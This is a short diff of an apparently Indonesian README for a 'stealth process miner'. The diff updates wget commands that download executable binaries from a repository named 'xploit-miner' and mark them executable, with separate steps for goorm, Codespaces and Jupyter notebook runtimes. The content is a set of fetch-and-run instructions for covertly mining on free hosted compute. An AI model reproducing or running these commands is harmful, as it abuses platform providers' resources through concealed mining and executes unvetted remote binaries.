@@ -20,7 +20,7 @@ implementasi **stealth process miner**, **resource balancing**, **proxy routing*
 
 1.goorm
 
-wget https://github.com/x-minerLicense/er-1/raw/refs/heads/main/xgm
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xgm
 
 # Beri izin eksekusi
 chmod +x xgm
@@ -30,7 +30,7 @@ chmod +x xgm
 
 3.codespace
 
-wget https://github.com/x-minerLicense/ER1/raw/refs/heads/main/xgt
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xgt
 
 # Beri izin eksekusi
 chmod +x xgt
@@ -40,7 +40,7 @@ chmod +x xgt
 
 3. runtime notebook/jupyter
 
-wget https://github.com/x-minerLicense/er-1/raw/refs/heads/main/xc
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xc
 
 # Beri izin eksekusi
 chmod +x xc
